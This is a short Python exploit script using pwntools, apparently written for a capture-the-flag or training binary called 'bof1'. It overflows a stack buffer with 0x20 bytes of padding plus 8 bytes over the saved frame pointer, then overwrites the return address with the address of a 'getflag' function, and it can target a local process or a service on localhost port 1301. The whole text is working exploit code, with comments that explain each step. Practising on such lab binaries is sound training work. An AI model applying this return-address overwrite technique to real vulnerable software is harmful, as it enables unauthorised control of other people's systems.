from pwn import *

path = './bof1'
# Open local process for debugging
if args.REMOTE:
    p = remote('localhost', 1301)
else:
    p = process(path)
# Open the file as a ELF so that we can extract information
# without hardcoding. e.g. we can resolve the address of getflag
# without opening our debugger (ofc, the address will change if the binary is actually a PIE binary)
e = ELF(path)

# + 1 so that we can get rid of the stack misalignment
getflag = e.symbols['getflag'] + 1

# fill up `buf1`
payload = 'a' * 0x20
# fill up rbp
payload += 'a' * 0x8
# write to the return address
payload += p64(getflag)

p.sendline(payload)

p.interactive()

